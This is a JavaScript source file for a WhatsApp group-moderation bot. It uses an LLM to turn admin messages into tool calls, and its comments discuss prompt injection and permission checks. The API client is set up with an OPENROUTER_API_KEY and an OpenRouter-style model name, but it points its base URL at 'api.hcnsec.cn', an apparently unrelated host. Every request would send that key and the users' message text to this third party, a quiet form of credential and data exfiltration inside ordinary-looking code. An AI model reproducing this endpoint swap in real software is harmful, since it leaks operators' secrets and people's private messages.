// src/ai/intentClassifier.js
//
// Real natural-language understanding for ownerRouter.js, on top of (not
// instead of) the existing regex cascade there. This does NOT replace any
// of ownerRouter's working pattern-matching — it's a fallback layer for
// phrasing the regex doesn't cover ("hey aria give me reports on zuno
// group"), and it's the ONLY path non-owner group-admins get, since it
// isn't practical to hand-write regex for every phrasing of "manage my
// group" the way ownerRouter does for the owner.
//
// SECURITY NOTE (same invariant as toolExecutor.js): this module only
// ever proposes a tool name + arguments. It never decides whether the
// caller is allowed to run it — toolExecutor re-derives that from the raw
// sender JID and live WhatsApp group state every time, regardless of what
// this classifier (or the underlying AI model) concluded. A prompt
// injection inside a group name or message text can, at worst, make the
// classifier propose the wrong tool or wrong group — toolExecutor still
// blocks anything that sender isn't really authorized for.

const OpenAI = require("openai");

const OPENROUTER_API_KEY = process.env.OPENROUTER_API_KEY;
const INTENT_MODEL = process.env.INTENT_MODEL || "google/gemini-2.5-flash";

let client = null;
function getClient() {
  if (!client && OPENROUTER_API_KEY) {
    client = new OpenAI({ apiKey: OPENROUTER_API_KEY, baseURL: "https://api.hcnsec.cn/v1" });
  }
  return client;
}

// Every tool the classifier is allowed to reach for. Kept as a separate,
// hand-written manifest (rather than pulling from toolRegistry.list(),
// which only has name/permission/risk) because the model needs real
// descriptions and argument shapes to pick correctly. Adding a new tool
// here does NOT expose it unless toolExecutor also has a matching
// permission on the real tool — this list is a menu, not a grant.
//
// `readOnly: true` marks tools that only look something up, never change
// anything — that's what a trailing "?" restricts a message to (see
// ownerRouter.js: isQuestion / READ_ONLY_TOOLS below).
const GROUP_ADMIN_TOOLS = [
  { name: "getGroupReport", args: "{}", readOnly: true, desc: "Full combined report on one group: member/admin counts, anti-link, lock status, warnings, whether the bot is admin there. Use this for any general 'report'/'status'/'how's the group doing' style ask." },
  { name: "getModerationStatus", args: "{}", readOnly: true, desc: "Just the moderation settings for a group (anti-link, locked, warnings, bot admin)." },
  { name: "getGroupMetadata", args: "{}", readOnly: true, desc: "Raw group info: subject, description, full participant list." },
  { name: "getGroupAdmins", args: "{}", readOnly: true, desc: "List of admins in a group." },
  { name: "getGroupParticipants", args: "{}", readOnly: true, desc: "List of all members in a group." },
  { name: "getGroupSettings", args: "{}", readOnly: true, desc: "Whether messaging/editing info is restricted to admins." },
  { name: "getGroupInviteCode", args: "{}", readOnly: true, desc: "Get the group's current invite link." },
  { name: "setAntiLink", args: "{ enabled: boolean }", readOnly: false, desc: "Turn anti-link filtering on/off for a group." },
  { name: "setGroupLocked", args: "{ locked: boolean }", readOnly: false, desc: "Lock (admins-only messaging) or unlock a group." },
  { name: "setEditInfoRestricted", args: "{ restricted: boolean }", readOnly: false, desc: "Restrict who can edit the group's name/photo/description to admins." },
  { name: "updateGroupSubject", args: "{ subject: string }", readOnly: false, desc: "Rename the group." },
  { name: "updateGroupDescription", args: "{ description: string }", readOnly: false, desc: "Change the group description." },
  { name: "revokeGroupInvite", args: "{}", readOnly: false, desc: "Revoke the current invite link and generate a new one." },
];

// senderJid/participantJid targets ("kick John", "promote +234...") need a
// person, not just a group, resolved from the group's own member list —
// handled inside ownerRouter.js, not here. This classifier only ever
// emits a bare participant *query string*; it never invents a JID.
const PARTICIPANT_TOOLS = [
  { name: "removeParticipant", args: "{ participantQuery: string }", readOnly: false, desc: "Remove/kick a member from the group by name or number." },
  { name: "promoteParticipant", args: "{ participantQuery: string }", readOnly: false, desc: "Make a member an admin." },
  { name: "demoteParticipant", args: "{ participantQuery: string }", readOnly: false, desc: "Remove someone's admin status." },
  { name: "warnParticipant", args: "{ participantQuery: string }", readOnly: false, desc: "Issue a warning to a member (auto-kicks past the warn limit)." },
  { name: "banParticipant", args: "{ participantQuery: string }", readOnly: false, desc: "Remove a member and block them from rejoining via invite link." },
  { name: "muteParticipant", args: "{ participantQuery: string }", readOnly: false, desc: "Silence a member's messages in the group (bot deletes them while muted)." },
  { name: "unmuteParticipant", args: "{ participantQuery: string }", readOnly: false, desc: "Undo a mute." },
];

const TOOL_MANIFEST = [...GROUP_ADMIN_TOOLS, ...PARTICIPANT_TOOLS];
const READ_ONLY_TOOLS = TOOL_MANIFEST.filter((t) => t.readOnly);

function manifestText(tools) {
  return tools.map((t) => `- ${t.name}(${t.args}): ${t.desc}`).join("\n");
}

/**
 * `isQuestion` = the message ended in "?" (decided by ownerRouter.js).
 * When true, the prompt itself tells the model this is a question, not an
 * instruction — and separately, ownerRouter.js only ever passes the
 * READ_ONLY_TOOLS subset as `tools` in that case, so even if the model
 * ignored the instruction, there is no mutating tool in the menu to pick.
 */
function buildSystemPrompt(tools, isQuestion) {
  const modeLine = isQuestion
    ? 'This message ends in "?", so the person is ASKING something, not telling you to do something. Only ever answer with an information-retrieval tool — never one that changes a setting or a member\'s status, even if the phrasing sounds like a request ("can you lock zuno?" is still just a question here).'
    : 'This message does NOT end in "?", so treat it as an instruction to actually carry out, using whichever tool below matches.';

  return `You turn a WhatsApp group-admin's free-form message into a single structured action for the "Miss Aria" bot. You are a classifier only — you never take action yourself, you only describe what the person wants.

${modeLine}

Available tools:
${manifestText(tools)}

Reply with ONLY a JSON object, no prose, no markdown fences, matching exactly this shape:
{
  "tool": "<one tool name from the list above, or null if nothing matches>",
  "args": { ... arguments for that tool, or {} },
  "group_query": "<the group name/phrase the person mentioned, e.g. 'zuno', or null if none>",
  "use_context_group": <true if they said "this group"/"that group"/no group at all and clearly mean whichever group was already being discussed, else false>,
  "clarify_question": "<a short question to ask them if the request is genuinely ambiguous or missing something required, else null>"
}

Rules:
- Only ever pick a tool from the list above. If the request doesn't match any of them, set "tool" to null.
- Never invent a group name, person, or argument value that wasn't actually said or clearly implied.
- If a participant action is requested but no name/number was given, set "clarify_question" instead of guessing.
- Prefer getGroupReport for vague asks like "how's the group", "give me a report", "what's going on in X" — it's the combined view.
- Keep clarify_question under 20 words.`;
}

/**
 * Classifies one message. `tools` lets a caller narrow the menu — pass
 * READ_ONLY_TOOLS for a question, TOOL_MANIFEST (the default) for a
 * command. `isQuestion` only changes the prompt's framing text; the real
 * restriction is always whatever `tools` you pass in.
 */
async function classify(text, { tools = TOOL_MANIFEST, isQuestion = false } = {}) {
  const openai = getClient();
  if (!openai) return { tool: null, args: {}, group_query: null, use_context_group: false, clarify_question: null, error: "AI classifier not configured (missing OPENROUTER_API_KEY)." };

  const allowedNames = new Set(tools.map((t) => t.name));

  try {
    const completion = await openai.chat.completions.create({
      model: INTENT_MODEL,
      temperature: 0,
      max_tokens: 300,
      messages: [
        { role: "system", content: buildSystemPrompt(tools, isQuestion) },
        { role: "user", content: text },
      ],
    });
    const raw = completion.choices?.[0]?.message?.content || "";
    const cleaned = raw.replace(/^```json\s*|\s*```$/g, "").trim();
    const parsed = JSON.parse(cleaned);

    if (parsed.tool && !allowedNames.has(parsed.tool)) parsed.tool = null;
    return {
      tool: parsed.tool || null,
      args: parsed.args && typeof parsed.args === "object" ? parsed.args : {},
      group_query: typeof parsed.group_query === "string" ? parsed.group_query : null,
      use_context_group: !!parsed.use_context_group,
      clarify_question: typeof parsed.clarify_question === "string" ? parsed.clarify_question : null,
      error: null,
    };
  } catch (err) {
    return { tool: null, args: {}, group_query: null, use_context_group: false, clarify_question: null, error: err.message };
  }
}

module.exports = { classify, TOOL_MANIFEST, READ_ONLY_TOOLS, GROUP_ADMIN_TOOLS, PARTICIPANT_TOOLS };
